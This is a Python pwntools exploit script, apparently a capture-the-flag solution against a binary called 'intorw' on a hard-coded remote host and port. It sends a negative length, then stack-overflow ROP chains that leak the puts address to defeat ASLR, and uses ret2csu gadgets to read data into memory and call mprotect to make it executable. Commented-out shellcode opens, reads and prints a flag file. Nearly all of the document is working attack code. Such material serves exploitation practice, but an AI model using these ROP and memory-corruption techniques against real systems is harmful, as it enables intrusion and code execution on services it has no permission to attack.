from xml.dom import pulldom
from pwn import *
from LibcSearcher import *
import sys
remote_addr = ["43.143.7.127",28518]
libc=ELF('libc.so.6')
elf = ELF('intorw')
if len(sys.argv) == 1:
    context.log_level="debug" 
    #p = process(["qemu-aarch64", "-L", "/usr/aarch64-linux-gnu/", "-g","1234","./stack"]) 
    #p = process(["qemu-aarch64", "-L", ".", "./stack"]) 
    p = process("./intorw")
    context(arch='amd64', os='linux')
if len(sys.argv) == 2 :
    if 'r' in sys.argv[1]:
        p = remote(remote_addr[0],remote_addr[1])
    if 'n' not in sys.argv[1]:
        context.log_level="debug" 
        #context(arch = 'amd64', os = 'linux')
r = lambda : p.recv()
rl = lambda : p.recvline()
rc = lambda x: p.recv(x)
ru = lambda x: p.recvuntil(x)
rud = lambda x: p.recvuntil(x, drop=True)
s = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
shell = lambda : p.interactive()
pr = lambda name,x : log.info(name+':'+hex(x))

read_got = p64(elf.got['read'])
puts_plt = p64(elf.plt['puts'])
puts_got = p64(elf.got['puts'])
pop_rdi = p64(0x400ad3)
csu1 = p64(0x400aca)
csu2 = p64(0x400ab0)
r2 = p64(0x400a1d)
data = 0x601000
nouse = 0x600dd0

gdb.attach(p)
ru(b'read\n')
s(b'-1')
#ru(b'read:\n')
sleep(5)
payload = b'a' * (0x20 + 9) + pop_rdi + puts_got + puts_plt + r2
s(payload)
str = rl()
leak_addr = u64(rc(6).ljust(8,b'\x00'))
pr('leak_addr',leak_addr)
libc_base = leak_addr - libc.sym['puts'] 
pr('libc_base',libc_base)
mprotect = libc_base + libc.sym['mprotect']
ru(b'read\n')
#s(b'-1')
#ru(b'read:\n')
sleep(5)
payload2 = b'a' * (0x20 + 9) + csu1 + p64(0) + p64(1) + p64(0) + p64(data) + p64(100) \
    + read_got + csu2 + p64(0) * 7 + csu1 + p64(0) + p64(1) + p64(data) + p64(0x1000) + p64(7) + p64(nouse) + csu2 + p64(mprotect) + p64(data)
s(payload2)
# payload3 = asm('''
#     push 0x67616c66
#     mov rdi,rsp
#     xor esi,esi
#     push 2
#     pop rax
#     syscall
#     mov rdi,rax
#     mov rsi,rsp
#     mov edx,0x100
#     xor eax,eax
#     syscall
#     mov edi,1
#     mov rsi,rsp
#     push 1
#     pop rax
#     syscall
#     ''')
# sleep(5)
# s(payload3)

# shell()